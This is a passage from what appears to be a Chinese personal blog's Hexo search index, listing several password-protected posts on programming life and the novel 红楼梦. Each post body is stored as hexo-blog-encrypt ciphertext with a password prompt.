7db7cf405cb721e387057d3e2144984b79c9009513c749a2277f365a30ccb744e82f1032394d5f00bd9ffb3bf4b4cf4058bf53230847274b09f2929ac3a54026444d7274412c7b52155d7fcb3ec9fcb553d08b0272df43c4aab72a5f9b32c59aef27179e550f2cc81220ad5328be6edc333cabed890d91c5b6b93b0d3270fe175994db8d541e043d61e1c04bb3b9888292a47954b641e7d481290a52cbb50528039594a8a638eed18935c5eb445c3c45ca3244e5aed435fb2ac82ac5e01638b2209738fef4121d311d6f9974b9c9cace010233c58ed1d56364b85fdba249aaf397ef86109f869624f47c8ac4997e5d8edb6ff1c85f8b57d83fbaf4d778b4010a45365d2e0a8ab881445a4fcff6cd4c4c5b6e59465a21559e0f393086658f8d1a4b2c824d93d32d2bf8925824d3c946ee4ae89acadabb4d7d00317fa798223614c692d9ea4c4e802ca78ce09e99a25ef77e6e05ad7a54f4ca038b10eff11f993ad63dedb23f6311a67df748fc9c8ab2e4578316e356f5871a5893bb5647daacc8caa772ba103988aa4e4a1f5fccf82f39a38e0821f17f15662d89e7916b14c89e3aa98b63b7b274d40c705fe35121c5bf78305635931b289567fbbc35918b18c78e31ccbd81515b890c4a88c580432df6cc0805e11d70ac43a9f0e6f7bd58d0250db7c81cb23b6ddd0bc12ea739067161749eee5f993a3200d2ff260bd16bff097ed3494383e2cb04f2c68deab5fa4fa1391d9fb7eb05340314267f56eed1e0f5f3001b97bcebeda7c5cc92cf4604a528fff7803a4777c8d46f5a3f2b204a1e57e79e97df4b9fa72c4e140b7da6e1db0285269ccb62ea62052f68278494a04708779cdb7c0b985f8ee1d8e4d176d80e33b58ce1e63a38b9db3596fa00d9a52b495bf0923e4c76b09a9ba9484e94c08a1b339f96efd9a3509e7d7865a466680a095f530bd2d98bf3109ac0e877e210570b7c893354e82eb9e5e7c52213f012869f7a492519316859596eac872e3ce76236c746aeab1a0ec8c1dd21303cc18c605bc759e254886745d5c90a1ab95f9f083220395c8909bdd1c925016b0ec5d2f67744c58c4facf006479894a2f8927bea6722d9b58673b130193d73c9777ffb1b3c8d8977d2be903863e8ed8e1a597d9031dcfb784917b994a5fb3207093f60e1fe5c5145c610ec09eb130e8d08896b2b393713524a348a642255da50d09b76d53b89b2048603053503386798014fba31e5e87a8338e62417b69ac3b788e81cb4a0c11198de5619bff72b2ee551c6cc0f84058b01b81d1b8b76c6a75b0c8737e2ab8518e3cf60d608fefa6ba9fb8e3f75969f9501de4be13d36fac2979291ad656a0f6e08d65f87e1cc5e0e7e9d82e6af061c93550a564f92ebd04deaa482eecbc012e724521f4ceb35c1aaacc086e02d9311c2692117f0f5b61de4be7323ba9407550b02a6208b18f8de31daa7f0097971672cdeee626b59f79e5ba35969f9e5e06fde53879fdb7e939d3b2041e2c7da1ba4f4f2e707faa66b37edf51719cf7f8f2d395b0adacd3e67f33dcb1df7b0fdc8678ffd2c2f4d6a6d7309c3ba5fa5874612c322a5839ebc8a9902a2ee21771ed3a3d3d6f01a17ac0f5276be96602021e3d81559aa28a2ebf0954841baf120641d739268a41f9a3c9ffc74c4dc71524bec9292fdc14b0f76bb5fade43cf3377e20d2d457cb5e88b224794a86d7aa1efc02326a50d1609fab1692291800e1ae82ce04d7a9493efb2cc678c5d6a37f98c8d47ee8bb0319a019ba3bbd6dc17d4e298fea66c5b2c7f0ad6d8ed60cfa189e9b2320d48a98a7bc4fd12fbba86649b180864452911c9539330246df4422c4bacc90af1f7113527d1f842fbf0b40a54a87d24309d223e6e8607297d65e58f48bcac5e6409a001b5106568a80a7a2e00f8413ff44d12a0fe792d98d7b4176a9d0ecc8fcd284817ddbb1799f40a53f0c7806c825b831b6c0d7379caf297cd9df783f7ced8d074b87cdbc7e887465c7bbb3a4d341c616c5e6071d6840a7ec7efb304bf804f9852a0b4f136601a6aeae2683a3d6835650721987d29470df92416a357c3621f8a53c974f26181b546c94de896d2ce429f2b621bfb8559f8bb7d69eb94526d44db9ef4fbd56a4ae0ea5cc7e4ecc256fcc9324fd0a31cb3b6dc9c148197ff852885cbfa71c5d61fb5c067976d8fb2e7a80089b898e0ad8f9cb09c17070077416ca49203ea60dc01cc5e162de0ddfffbd578696fe6621274b066c18ca5232af05960b210a781f8b416e707c57c394f28c8bf8205343d4e2f0e99eff2236852527cc140b3ea44ab4e5409a99a57726139bf91a214078799430aaaebd200656ee47d47fd7a1382b6db8cf0dc61a474017b7904558d9f12cccd6dd261cefe898f5beaa645e94de37f45a4a46ef879577149ad60f721e7e5c5020199c339a48184bde163b472af2c758b5ed26093971cfda0cfdbe831d090249f449d056879ebdcd4b78c4d4929dacd16a69ce3640b209f148e8572cbf4460abe5817175eb578c22bfffb4548fd2d83ae4bddbaba374e1b1ce83050144311500504e1d4885fda52765c41e111ae11984a2c0f5e6a8dc4f7ccbf846e31b39f3d3b2158822d14bb33d7a6e820a4085c0c26d15917fc11589925d77816e2f57d69a0b722046ef1d5cd052a9e6d6c78fe8db7a800302bcf684ac12fe21f074de4172faa67025fb1c6637c3e386cdedd275cda4ee160e3d9a6b519aeeebbcaa572040eac0d1baf876ffe743fa76f0d22cc05074090e133f1d52100af2c754c86a95090219c4f0173e4f532c4d39e116311e3537fa4c4063ebb99b50632cb08edec5e61dc8cfd449d62a7d1e7fa8f83c118632877cf05cdd0e811e6037f8e41a7a1a86e67ebaedded3d11d7aca404151e75db1d496a2848b417c08f3d227dedadcbe2dcf9614552cf1cbf6793154169196d1c980694cddf1908f0bd31629cc4f340ce14fdb954c5977e38eb46770cde2d7299db6a29c43cf2dc63576c7ffa9111d700a0f8522195e13513bc46c52bc350432766b9b864946aee2c521328cb94b43ef6fab4ee7db3d4957ad20875363369f25d655a152baa85bcc95dff6f14f7aff698495bb3f5681da67cacacd3c984b2fc98560b398fb2fe69aab5dad7dd3f832c59f67243ba07ede78df3d187f10f1468425b3413595643410d01150538145497fa242596e7d4a08195add2d027bc67d36945efbbe27c12fda57705c7691770ed3d7c63a07be14354e5277b7593690018520da69b64d7e761b54639b872078a5ae0884f5c0b1ee1944459b162f023bb166cae004cb0a1dd11c30c5a1c5010f14010e6376c0e889a0ea811eb8de90d5fcaa4082084363b52d0651ece84e8817f7515af86133d882f03fd287dd6f39fce00df9b66dea147cdd7dc0b44909961210d25fed52594aacc5765c7256ced0d03bb8519f5c02f017f6ea06183564b40aa31e41422b7de4d3584a4467f373079f8695768be4353c51133417c7d2e2c52aa392e03592f1ddb46e0835cce5d449c696bd948951c1c2ad2a90f097f68a8ad5e5e85b3574e8257b78c03145a28244d1469df7531cb58df3f36fae4d3dcdabe051b09d8a284f50102c640ce8d60a79875737e4ec380924d4dc05681c73e83f45778a4b65299dedbc4187192cc9651fd7a7088dbb321740b60038dfcb00c43c4ea129e5a1ee1d533451dde95f202aecaa0e0399b1204624090ae33e8f739e5d31b7751788594aef3e6a3d60b4b0cea4349ae3a0f3b30c840d0fe6272457175b5243e14e4bba986c5c4e438dae191b4de8497c6ace73e4fd2d72191df457929e75c5c98115395e14838ebd06ce872eb1e1797e9f315c316d957c2d79975f184e4511d36bda240318b6417ee42444d659401c075630f149940013e8487280a768d76095d6c1e528ddf89e450a9e223db4c75480c2bca2ef307ef9997759f10e1ccc0b9129ed238f3938f8b9f155ac8fbab2202b9902056d8dae544f2e5e70ba6c0a874e9608ca294352da103bfceb9b61d8d5b7726f5adb94246912cbae3486f1d141d3e8775549832dff5a3c0ae6837a0d69ffc4d1d561c9f1318a4a589ab83391a4a17f412ef2d22c45b448937bb1a2aee26802453029c8d83e57488c9a5b067f9b5a6e8b8559c2f16d93ec2cc2115a0006a1fd80908185dc30827be40ed0d98f47f419e6498f6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员-印象</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%A8%8B%E5%BA%8F%E5%91%98-%E5%8D%B0%E8%B1%A1/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%A8%8B%E5%BA%8F%E5%91%98-%E5%8D%B0%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="c9f5baf13d51085396835fc961cc55cd7fd285a3a2f6197fe736d6453dab783d">23933bd71f3b356245e911eee53c218a36b1d6f84882891589910180e021c58cc0a1b4602eba0b07fc3c7c207f6ea3d4c24954d09627c3ad6bd281bb46b328f2d88c26359f4fa87ee46b84e6d59a39c4318a2811e75290acb85a2f21bb73a9adb4f01f7321359800010487f78cedd916611987af04b49ad460acc0085165c9e9e1ff12b689ffdb4f73b1465ac745d33eef1017397abb950facc311fa75de5ab3e078c362356a88c76b7e0e2e601e4bfa7c919c3eed24ad4d6037a10adbb13b521814292562829b8d3ce15855658330892f37a32c58ba4510e490fcdd6355f2771c0217f9797306fe493aff8be1c7b6657b3ade841fe255cc0a6a5ef7d45435efba7bd7c124bd78e9e5472b3cefd92f9f4166bdbc4548ccaf2f8b3efb8fb4dd61197a4d41b6724272faa920ffc029b86ec5d00da6da7cb9180e7b22576da7acd6d92b1bfc2de89d7bc12ac0b6910121e58ed11e1126d37d8d7a93b7576a762aa4fbfe30be9dec0933210b9ea6a3c0e5d6407472f1986c623c124615f6db6cf24928331bc1d174356027ba94c959cd08a734ee88562acb98d486d7a0d365e965c9585ef4136c431fd0a241f7a6dba567b3876aefc9ee6f20428d2884821c85aa11616e9f57c36de0c5168d52633843500e82818a5bc6c9d79fcf15f629ecb3486c56e90b96abe9250c661a2c42ff7e94ccd6da8806ef2112ad0d68ca3feae7dd90745465005e62ddb4388c412fea38d481e336d7f7499f139c70e2ef9e7459f0b43691058e83c3159a7e4fb0016bd0605cdfbd15fc31958261f49fc3bdc09cbcadc3295d87eb0c7772c792c9796d015b4ae9b2152e8b28de55f7eb973635cb372a540ad8952849ae44cded245c774d24867f015647afda20d7b59e9d6c58e1282181508b014bb913253882ca276e5b6b9375c7b8757c4b91b5e4d4ac7ce16214e9dbae8e6656d022e113540d19232938a4a253410d824b62161e4638c1012359291c8bbb62c8c6ead873caa3094ef69678bac70fcdb8630ce080322ae3eee15114e4bf4d50cdc27296c919ca5cc337cc11773c4d79e821194cda846e8d8a851e91a2e117f794522a4d6bba4a97d7e856ecc6dc5210160a3c94cadd6889694e9458ccf66cc0459d48322da8c7882b861363a69483452a7c41ecdd27a7d2754a01135402a2718cc29258df89d54e2dc470827f295ecc8d195113de775edb79069f853ecb421d4aea0958e156a44c202804b5a7e1f26166bec0513baec3fdb76d0dcd10354b3f0ed40ff40006380037666f97c6b4db7f273451905cc62e94b42db990c4237ce1486425727492f98ed8b4f8ebf119c25ba8e8687dc4b11575d609ecad70e235f67d596b6734da62232ff079ddf4912f94063e548149922d0f0737129fa96c4e09fc164f688adae731020902ef2e47fea5912dd079ad9292daad4d10d37705a9cde2483e61bfc30defbcdd62cd3aa1de754b52ac770a5643634df02f8de5f6f0121002d83d494c4aa54e27c9839fbf4d4dae5947b45b910218cca5818fcb39d18e4e525d35688024efd774f81ef606b8e257afdae0b89fb9811de4d4422b755f70d3e06ffe2e1802e58adcc496843a677ec867b74a097b1b034bec9e1514d2b3ad8e6ee96f5bda38fc6ae16f3386adb05ee2252742896fb7a5c71fe7603e0b3fef9eeaf23e4e047b897ad097dd4d4081ee0d541a586d52161bebed15c11ed884baa744a020b711664363250eccf99f7adb9ae00a916275b7150f08b37076dbf5df7809885366b257c3e4b9e09e2e05b0f1ff91894599d3dd6c3010f4d30095451aed342af4dca5c0821c90608eb6866663011fee22a74424a52734f537af2b626ac86c6b8f5f3ced3f2c7f5c0c174a7c6372e7309f0cecf3ac1a64446c79914c3b291b07771422206eba2be1659b01b10c886a653a30f6194a6fde33705a93a175ba286fefdb621a81af3ee835150b6db3c9a9a516bfa899862b68512939c7046fdad3900a2bbb1e24d18e9da6552099307760b2a2a1710de7b8024407dfbf534026e2ffc4d8e50a8248df0e545fce070fd0c3d542489816c22b38febe7f985558d439887c09833f5605327b0f4fb4bc802b9f3f327813af3d558f3c9b52135b0265d922298755674ddf0ebca60debe5e1d237d1ea26a919a24acc4f0d7141fa156e13c39d490ef063e85ad5325a4499193931b3c5d0c688d89ba477821609382f9cd9aadba53453e5ffe2d4c1a1d25a2180c98483d9c67bfb6cca3b3d7870e8ebe7bda3587e3c31a420c558b110fd18e599a81dbde2f54d94403a639a36b31648e7fee2bbbdfc3dbe798ebd3de8039f5f71cde9f36fd1fddfca5db0d77dd6cfb53a24a03bfdf619b088a976cb3e987e609dc7d13072a3590c5c489ea5e36822a22e865eb4c71553458e09ec8e94c99b489ba6b6fc8c89b1ab6c373e2772e2763fc9d62fb102cba47456cb5b25abb888bb91601fc5970716d2e0d8017196f32a0575206fa607d15db3d915791369197f0d85c31042eeb254dfed5b2fdc48282485a0ce2396842363685b731eb702db5eb2b62cceb0449b807225f36aa6b1bef9f489699d3c2622702287ca1c0c34949ba1336a0ce2ceb32e4eaf8135e8e52f33533e5bd780327300708d623559defa15571ba7e291592cb49ba0224bcfde61cdbedc96b29c8050363938df142907c604f66fb21e4d527ffc883bfe8a42dd2f1597625cd6abdead2b28e37ee00ae5ca0a895d5ca42d67807e4b55bfe879d67e69afad8b8473cc96551b2b03ea41d62fb21425bc6d75582a538071f54df5addf04557572a0d1ac6bd39d6f3110409f7bc37a8dfd188ec51ad8bfd0d022ddaf93ffd6e2be1c3248325ca9fe6992c2fbb3fd6f4249a30d0c1d591ebed75510a4d918e2752709510378e12ecedf5be1dd61236faf7a00ff8a015e3c1490d598bf26137efd1aa1350d6702fe44bc4049cb84b5910bf99dd9c0c25f303ae5f54a47b1957b73631e38b47f9058dcee9f006c05de96b8bc2d75637a8d4df952760d24e615c7a4dc1b415f17624ad31b3238dc6e671085b332d17af9c65d4560f91324c4df25b4e6326aa28d3f6b7c736a34d278fb814d74eb1680abd185f1c8ab1a80e35418c501f3a8ef84df25d9e349e2202ca2dd41a4e71e3fc70255a6935f6d693e953859c730c207ae43a734a4ab616ec8b5e449c5d411f7c67fce73cc0292de3b3df2aa304ca0aaaa41b581b890acc8d5e4c8b192e2745a5b826d52b08f0134bae27e99ca1e034c5d10972be4f37ceba773b2327bbfb324627553f7c8a919080c2e686c2abef2aa081be113f064fffb7a07e0aa3dc7eaac329a0d73a2b70dc87bf5c72852e8e9953a25d55ca4d307b43f8793a62e09fedf13c0705f39e096cb983aeb7040d67f56e7dcc65464ba379b03ebd573339a6f0dfea14226c79521406670936ae1b5e600d181e69faed4139316296826012738ee15d2366a16898000b71587e2b8b4acc9e0bfb8b08cfedf316250edc5f673b19f7a882896ed055452693ad8c4b629a69a673ca4bf1aa946330045bd9c93cc29b109d4b5f7314ca2ddebe429cfdcfc6b0fb22090f9af26c974637df0829d4c27fc782af200849c85f2bac6c8ffcf1cfcec7f51adafd7f757680a1381d21432704fc4bbcbc69afcd3bfd7d541f85a28fb30007935c9fbbb5b8aab95886fadbe5e4366e9bd7dfce7b45631fcc4489386926fe737d51bdd753cf32dd4f9cb624de4c99359a4c4c58c561bd8ecc53e33c92713f1888658fda0cd70ca19a5c29c14ca815dc4774331a1668cbe4dcbf8ef5c722d994e65bcc322896f5ba3edf8cb3c83ef31addfd3d8f62dc45f2422d9c5372da4e52077844088ccb48066a79aac7af7b6895475abfe5fc95e77b5eecd0418140edb5bedcda9f2f9926d7848db4f8610cf1a2624c5ecdfc8d17391f3ba42174bd4413b8400e17e0b13e75813d1074ce6604c844b7bee8e5e875097bcb16b730a3ea0c5a220b41a4804a4828fdd29028c7a5fd72eaccb191db1808f3b7852cc347a689658ac7437625e7b991880f376d1155370e1c6bff5e7594a2842a597c77295f43f413156a7417bade65a6a3d3a298290b52b58d3ee43302eadf4eddec648c268b99d8caadac1d3a8d8106af36909849175b97b8270be8bdb7897b82a06961fd7340865f0d3d76d571bae04189bef31f23afe634fd7d85369019f2e67c13f69eb5157be9e6ffda71f28d85b263bf62051fd39d64fcb6812669aef21dc7ec0e32fadce16ca2492f3702c2c91b1f20654478b522fd27a21d8aad3cf433b100d4325ffb1aec0251cefd9d89ee6fb838f0bc125e37a3838ad6eff50c6e2b706e0349b9f48b9f1d0df82a2cc36ede0390973bdbc8fa139d51925b5b0832770f623fe5a419a2ea0183164a4dd4539bc94ca0a4235e1c8e61506ff722a5def2f6bce2e4aedd75156e93f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红楼梦</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%BA%A2%E6%A5%BC%E6%A2%A6/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%BA%A2%E6%A5%BC%E6%A2%A6/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="805ae8ce0f8a5d218b20f486114b00f2214fb1522b7ba9bb8dcf1dd14d3babda">23933bd71f3b356245e911eee53c218a36b1d6f84882891589910180e021c58c26299352d5a9df3f2a231c472d8d4446e2999b5d07091d61910ee8973b47be8f9ec5d851c65836ddcb49fd8856ffd358fa9c22876d90fb00a6e46d49556fbbfa98394d8214a86b330776a5943845ace8e06db8957b4c738c8747984f2927bdb34a40f03f02f994fdbddcfef9c95df3e4425ec38f9fb8bfc41290accd45dbf28f108de222591676d84bfa35d8ae80536c8243d3110ccff2c9f7c09b38fdd1c96204a08f2e99faf6d55485dc16bfe932319b30ce891cac5e26370e4c545908de766bae89ea16cd05af338e0c0a695aea65f7fe3b93d4dd5262c3151684cc98b976b230c3cbc4bdfd86614bee67063459f50d11b387cb91aa3838531f591d76e1c3a19793fff7d58e68ab62e6b8da5339caedb51f86b581732dc5c1bd4a27ce3b0fd03847fa3522116040bfa95fef107cbf027b61706dedf1f468dcd2a1d435336862c568860e188730db393e30baacbaed3deed1c80b47815a856afd41dc5813c2a0cd49bd88bd215fc3bd7cecd85f65cd7798ad5eddfdec305fe692ed69e1a21bf81bbf25762aa76631d9a763fdf1a596adb27993888e1c368711e72bb1b35d3ad48e4857e44c176b146bbad2a531cb50f317c2af91bb182c859dbd038dec44230b7c75526ab601600f237b34be51f48fdaf79ff5bece12e994f2aa089215fbb45f98b86e592a58a288b406442249fea86ff27f136f6524886df875c5edd0e220d58af69d28b0bc7e433b514abb3c370f75ac66288f3b89bb52c85216f77243050df563d1b577217ada7656d3d846ba417e79bbf4c11e338253be805a3fc0d391e5b9556bd3b23f626c6698bc2f4987685a06c9d8a8b9423d87002fdb4c3e0ddb7ddba60dce3fe9b3af4e592d8b1a224bb54abfd52f53e7c23d01e0f0f3baf6fdbf3e5e2ec7f93c0bb4a2dff0be05cf8622a2a27618511c0332e1ce50548801882017a2d186e70714badb10abdf3ea2d9ed9ba900c2ac06890a731d0768c351545dd1352353d37fe493147d280ad09819f26b36a1e67953963e77030a95320033e405dc8e4b4fa7f6db8bde3487c391d6fa75421ba0b2ed7fef562982fcc097e187f498b08bacf091f9d03d3d841a0d0c49ea3c639b2132f12e6b43a580510edac019cf068178c3924224ab7409df7bf494ecc5aab8be0be04b0ae41cc8ccc2c73c34af58327f7c1b1e0f6ed8a5677071795b4613b8a35e15eb7d6f0d167b4d7fb1969e5a36062e332c587bba8d3f7c8e554bfc75f22bbd1a3c73b7bde0a7ac8e6b76a409b4beb843ed299f74306c91cb010a9fdc05dd342165130f74c62bdb441f0489ef465e895b37e59ca62c0bfe96ce5c338a7e02bddb4a5b772a01df04a99b555ff3ff5e3bdb3f2531b26f2e715df3a9001aad691c328ce85bd1dbfbee0897c5ecc40a4ff03a4b35d41e0a7640f9bf1d118c97a70da9eb193a6a6a0e85a31086cbc44e675b73c2b40631c1e837495c7806676b239df9a34135c41f60a13e635922919d0986091c6f2fb18157cd1c2345ab656c6348b1369d76c69b89742bc13df68c5834df0d58e291a74a579ceae922e5e458f647404d5c4e45a97ed1a63be7cab020cac907d1d2d9c8813633ae598704e57ac95a25099bb5d15102da8134cd9619cf2776a5383455a440faecf4ebc0ca58fd6270ab82c48e23314b4a83ecd628f6e388e15a3587f95bf6058ff069f4be1f57236a7248d0f800c3c9d41e85d814763a85ca7997b20c1185d19827b2601d342f156b92bec01d6d625980179e73d5bdaae61b64c27580adae484db06c22a5ffcc7ad31ecb02e888ba51e5733747af1f1dac086630ef38d80dbbb24228260fb91d429564dd9fb40faa03e636ac7b395e51f9888fd271a03bcfc453b61abfa5a784d58785d672be733922cadb8387660717151d4f2039f936106f2e3765908282d4f59e03e8f13c33ec953d7f719ed22f2198452ba3261e0fdf43d4a33d73f63bb254701d913f46835a317ce720cdb834de7d37652484f4153d1f132b6d792a86863d8f56ce7363011ebc627b6552dfe184265540890c91f2607c9252786a6d466a956e5542b7d56f4f791b0515d470824d51210e3b94f615217a514447dce0a4a167eefbbbb0aff28e7e83ae8cb940b7a7508a45642de4a801a11b012ad207757df55176cc0beeebfdce3b9f9ad492638272a65b6a3c9370a9a7b78fe54175c096811862e725c1a812519ec0a826c17ab67163453473f5cbd4ab1cccc92f34ce1f2ae01395be2beb83b16a600f1ba0d5e0ceb1a4cb979efb6e6e22a2d49d3bd06445ff3feeac73230aeade3a5ebfa420529ebfb3c5b88cfc00dc668d77e588061c08ee9694ae0340c3f4e2e82a0e0403db0794294c5d86c5ceb944ac6b48642bd56c229e57927d0c72f67c613e0ca5ef285a639b3ffe39f5c67185215dbdd5372d76f644683bcdea555a73d88a1c91efda508955a28f5753fcac9a3a8c5e8d35549600fce6f47462345ffff1e433578d44432a409758a7e24899b1cdee728189cde54c2e935e6f5ae2d42c8739f2bc1235643b8fd525cd7326c23063783b9067161a94314f2ec889bd7c75efab5a767277c5c587823f58b5853d76fa53f943afc673c7ee0d23853f3fd7743699e48cd5ec11e78150ec032cd231d5b97bc1304f2e733c3c56d91cb0bed5e28f5c9f4c5c87dc685f09b71cde34a65ebda2ce4b074006d87c79bd2bcef5baba76d7c05d5852eb7b01bd1b9742e07b82a27efc675c136d6ef715016332decee1a816939d5a7471337a79217280c3a4458fb4822abd2cd27493f2cf6ee8fbd6d37fb0c3edc78cce340d14cb3daa5436cfb05ac37beed10521f53107e0c9e3a5f99d180c74e3f734591cb560cf058e4a622f037aec3446cc1676d991bfc29587d7fcfd96a1d5993fba454e0791b373ca620193fa7b41066c13e1bdfe2bcf22de5c5e9bdf3b524ca6c420411b2c2aea9f18700a17a1aba4c6508eb69bc33d451e2399e94c509e1bc4d3c32ac2cde03d4fe2cc64ccdc6368fa621bd60303643b72cf31683446ea3a686f4904f829cddd2ab0de125cab80c2fcc4fa1317419fd172ed17f749a21554b9d12de18aa6cbed832d0b48a2751a910dd8c9796184dff308283e361f92e95b9b008736a9561d443e1e134a208835d477916c7af61e2ed8f135ff758566dbc414a86aed8c8941619eabcf1d11fd42516ab2c4abc203e1e6217936c851277a44199b4b52a553bea7597d9bd6c5362c04fcf6194bb0552f0d1e067c701a89690decb4b5d3866c8ef809aeded907423465aba34c46e842002a624908cd9c659b01231e00d621eb6c24ce4024660f08eaf69a0f54f766cbb26314e099832642b0fa824916c2593bed42498f0b08f317edfc919f5a31782acc294cbf3d3d08a09b66053dbcaefd1c957e52062c05933c390f3153566df76b4a26363b980e79be57c5b9b91a5acff1c22590c12e07d089fd6ee5dcdb2f78ca0347c12fe0736ee2f54e244f59a6f42c5aeab810c9035240848335425a1098e6c2d7c64c5b2777970cbe41c904876684d44b76d9eca78d025bb32a9190679b55599148db9cd07e8ca2b08958ad69bc3761f07ef2be2fa1f80633a1b0bd3f4602dd46a52c4d3be819962da3fbd355d23dc275122530928cd070a8ccdbc4607b83ff7ee667f9a48cdf5cc44f6fa1b6bda54136689d7e65bd4819a2d3acb9d615868d60d56554e3403971cc4232744c3d1709eae000b8149b8ccc7cce80563a87b0f394a1f8118584f5490ee3a41c8431fd34c93b83fd1baa3e67db915b2ceb8b345c7872d7f315df26e4ba61551fc45a28a7263c3a49fd9c0147064d3eba57cac6a8f402ceefc5c375a80bf31dc537eee10708622b3428a79d1cbcb7827d03fc952f6039a7ceab4100cf403482d80e1762c3cdc95df99b2443c4faf6c5311ca241099769565f2e73f31c9994d8e8a2e9b65184e3ebbd7967b674985b37fb147870d421aa2221c0621a86f37cafbff2d6d422d17655b69cc4c3d7e82e75430e4adc1ade6b211fc3c3b8430b70b5448390f7156a1426689cb3b5394a11eb7819034346de5ac1a210ca89c95306190c519aba2919a1f277cdbefafa5829c17a97087494ebb510ed8f5fd21f8f0f113358d86fb0bcbdc54b82e073fcd4f0e12750557d3301b64b6b3050d0130bdc32d5c89b3033d764471241c0a262d0a96170afa90f5adf537b9d8157d136114d8f44832643513383d832b1f5d2551656598a1888164cf2de30f946ed2834bde79a05359619d1cb799d625c7f3c5a5e87bdbb56bb5615ff8b8f10384f2429eef8d10e315fc420a10091cdf5c6f761da7cf7bd8f9fac10a95a7e256a43e3ade8fc67151e55ff0031c1f584f60a687c2837691be345916342e90992bf5ef35cb0121da6c54bd0a00e7af085a9708ffb25bc710eb38ea713f720f0296a0659138deae40283f6bbf05e98d75d7ecdcf78ed97fc192d0139f101155f65c602d160ca6877c8db3834027c59be60dcce39c12b197cc456b29452ec4fea84d0f3097b6da2de93128276ce85859ad6288c3ed29c36a82140b0fe362c12545417b21804274eb3a35856d172882b6a98677841624c8fe1379282ea561bd681e8d8bddcd847bf1f291b9765c84de37ae3d67e19919319a108d2cc324c1d19f49731ccccbc6b5acd99b2ed7a10903bb530e267e4e77b429f6b319edd739ea70eb75e014b977fc5e93b9bf599ae745899fd635376cfa26b31bb85d546895cf28a73d6b24dd5f839b1a5c7b6b6263fdd5c1d006b40bdb3f6d8bbea6fdf78277f6a4dc3ae2f326b4d0ed072b4593aab593eb5093392579d7bce5071a566341a20fffe806342a28a73849eaee31c24d3244a354c2148f11f64c74034b1e84ed92861b71ee7249496c3bea543e50e48633c6188784994a94be9f867fa97e299981a2dccce340eedc4804da532cf770c62d9bc1c9378e67c4ed1bb8123efc35877f739cc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
            <tag> 书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员-前传</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%A8%8B%E5%BA%8F%E5%91%98-%E5%89%8D%E4%BC%A0/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%A8%8B%E5%BA%8F%E5%91%98-%E5%89%8D%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="96e4dfa939b15bd2a7d71400f06097056afa1b4b897573c7cb6d3ae99471e85a">92925db3e24629c8cfeed2d0eece386440cea7fc784bef7567db60a2b9623e19c08dac83eefca7429a54bdd3ed6d247dd8da7fc45a91b9a365d5f060d1178c2cb2823ef01e707845571ad262159eaebdabb6f293b6530d0d45913f7d69c1e08e53ab4e4dbe37f914f9322e5af6ab31767c62f27ae7d6541c15b9962c4f10f9ba9fd5a068e262770b7bdc59fdf7caec8686384339952acdd21864250fe76ebcfd98f28b785e730b9ce894314654ff62ae2cac8f64a83ddbb4a9df3a573084e80226778d2916029eb75fd525a3f51b01d5069d0d34094f7f18a7a91b6511bdae0b734b27c1cf4ebf6ecd99446c2fed177e9ffd2af8c22b23987eca4247998b4862e0d98a93b53319c8cc6183b226b61e0996b5c1d01b00ff47ac1c6a73ec74a0c8323e56bfcf19bf6e4ad974f6c98cadb42c90e5c3a7f7e54164d17a9461ab7734d75995e91ab7a0c0e6994005404502fa7c0665056e505f3c0315e993758ecde1aab928f6a0000612073d83a6b03d2fc224f15c19a5776de7148199533d4658410d4d88942ee622c5061636f843bd5bd63cb0c3281d7336096cc0876824fe5eac8add3183a9f62cbf